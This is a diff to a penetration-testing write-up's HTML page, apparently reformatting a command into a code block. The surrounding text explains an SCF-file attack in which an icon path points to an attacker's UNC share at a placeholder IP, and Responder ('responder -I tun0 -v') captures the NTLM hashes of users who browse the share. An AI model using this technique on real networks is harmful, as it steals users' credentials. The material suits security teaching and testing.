@@ -147,8 +147,9 @@ IconFile=\\&lt;yourip&gt;\share\penis.ico
 Command=ToggleDesktop
 </code></pre>
 <p>Saving the payload.txt file as SCF file will make the file to be executed when the user will browse the file. Adding the <code>@</code> symbol in front of the filename will place <code>pentestlab.scf</code> on the top of the share drive.</p>
-<p>Responder needs to be executed with the following parameters to capture the hashes of the users that will browse the share.
-responder -I tun0 -v</p>
+<p>Responder needs to be executed with the following parameters to capture the hashes of the users that will browse the share.</p>
+<pre><code>responder -I tun0 -v
+</code></pre>
 <p>When the user will browse the share a connection will established automatically from his system to the UNC path that is contained inside the SCF file. Windows will try to authenticate to that share with the username and password of the user. During that authentication process a random 8 byte challenge key is sent from the server to the client and the hashed <code>NTLM/LANMAN</code>
 <img src="https://i.imgur.com/r9ZTCo0.png" alt="" /></p>
 
